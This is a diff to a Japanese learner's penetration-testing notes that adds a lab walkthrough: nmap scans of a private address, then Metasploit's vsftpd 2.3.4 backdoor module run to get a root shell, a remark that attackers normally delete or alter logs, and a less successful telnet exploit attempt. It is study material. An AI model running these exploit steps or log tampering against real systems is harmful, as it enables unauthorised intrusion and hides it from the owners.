@@ -33,6 +33,7 @@
   - [実践してみよう **ペネストレーションテスト**](#実践してみよう-ペネストレーションテスト)
     - [準備](#準備)
     - [実践](#実践)
+    - [調べてやってみた](#調べてやってみた)
   - [メモ](#メモ)
   - [感想](#感想)
 
@@ -277,16 +278,76 @@
 * ポートスキャン
    * 空いているポートと使用アプリ/バージョンをリストアップ
    ```
-   nmap -sV 192.168.11.3/24
+   nmap -sT 192.168.11.4
+   nmap -sV 192.168.11.4
    ```
 
    <img src="./img/ss6.png" width="600">
 
 * `msfconsole`
-  *置いてかれた...*
+  ```
+  > search vsftpd 2.3.4
+  exploit/unix/ftp/vsftpd_234_backdoor が使える
+  ```
 
-* 管理者権限とれる `root` ユーザー
+  <img src="./img/ss7.png" width="600">
+
+  ```
+  > use exploit/unix/ftp/vsftpd_234_backdoor
+  ```
+
+  ```
+  > show options
+  RHOST が空欄であることを確認
+
+  > set RHOSTS 192.168.11.4
+  攻撃対象を設定
+
+  > show options
+  RHOST がセットされる
+  ```
+
+  <img src="./img/ss8.png" width="600">
+  <img src="./img/ss9.png" width="600">
+
+  ```
+  > xploit
+  攻撃開始 rootユーザーで操作できる
+  普通なら ログ を削除、変更して抜ける
+  > exit
+  ```
+
+  <img src="./img/ss10.png" width="600">
+
+
 * [CVE](https://www.cvedetails.com/)
+
+### 調べてやってみた
+1. nmap
+```
+> nmap -sV 192.168.11.4
+...
+23/tcp   open  telnet      Linux telnetd
+...
+```
+
+2. msfconsole
+```
+> msfconsole
+> search Linux telnet
+```
+
+<img src="./img/ss12.png" width="600">
+
+```
+> use 4
+> set RHOSTS 192.168.11.4
+> exploit
+```
+
+<img src="./img/ss13.png" width="600">
+
+よくわからない...
 
 <br>
 
